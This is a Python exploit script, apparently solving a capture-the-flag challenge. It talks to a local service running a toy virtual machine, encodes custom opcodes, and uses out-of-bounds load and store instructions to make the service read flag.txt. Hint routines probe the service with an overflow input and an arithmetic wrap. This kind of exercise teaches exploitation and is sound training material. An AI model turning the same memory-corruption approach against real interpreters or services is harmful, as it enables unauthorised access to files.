import socket
import struct

def p8(data):
	return struct.pack('<B',data)

def vm_nop():
	return p8(0)

def vm_load(reg,mem):
	opc = p8(1)
	opc += p8(reg)
	opc += p8(mem >> 8)
	opc += p8(mem & 255)
	return opc

def vm_store(mem,reg):
	opc = p8(2)
	opc += p8(mem >> 8)
	opc += p8(mem & 255)
	opc += p8(reg)
	return opc

def vm_mov(dst,src):
	opc = p8(3)
	opc += p8(dst)
	opc += p8(src)
	return opc

def vm_add(dst,src):
	opc = p8(4)
	opc += p8(dst)
	opc += p8(src)
	return opc

def vm_sub(dst,src):
	opc = p8(5)
	opc += p8(dst)
	opc += p8(src)
	return opc

def vm_halt():
	return p8(6)

def vm_in(reg,value):
	opc = p8(7)
	opc += p8(reg)
	opc += p8((value >> 24) & 255)
	opc += p8((value >> 16) & 255)
	opc += p8((value >> 8) & 255)
	opc += p8(value & 255)
	return opc

def vm_out(reg):
	opc = p8(8)
	opc += p8(reg)
	return opc
	

def vm_hint():
	return p8(9)

def get_hint1(s):
	s.recv(1024)	# Input your name : 
	buf = 'A' * 20
	buf += '\n'
	s.send(buf)
	print(s.recv(1024))

def get_hint2(s):
	s.recv(1024)	# Input your name :
	buf = 'user'
	buf += '\n'
	s.send(buf)

	s.recv(1024)	# Input instruction : 
	buf = vm_hint()
	buf += '\n'
	s.send(buf)
	print(s.recv(1024))
	
def get_hint3(s):
	s.recv(1024)	# Input your name :
	buf = 'user'
	buf += '\n'
	s.send(buf)

	s.recv(1024)	# Input instruction : 
	buf = vm_in(0,0xbfffffff)
	buf += vm_in(1,0x00000001)
	buf += vm_add(0,1)
	buf += '\n'
	s.send(buf)
	print(s.recv(1024))

def get_flag(s):
	s.recv(1024)	# Input your name :
	buf = 'flag.txt'
	buf += '\n'
	s.send(buf)

	s.recv(1024)	# Input instruction : 
	buf = vm_load(0,0xffd8)
	buf += vm_store(0xffdc,0)
	buf += vm_halt()
	buf += '\n'
	s.send(buf)
	print(s.recv(1024))


def main():
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(("localhost",12345))

	# get_hint1(s)
	# get_hint2(s)
	# get_hint3(s)

	get_flag(s)


if __name__ == '__main__':
	main()
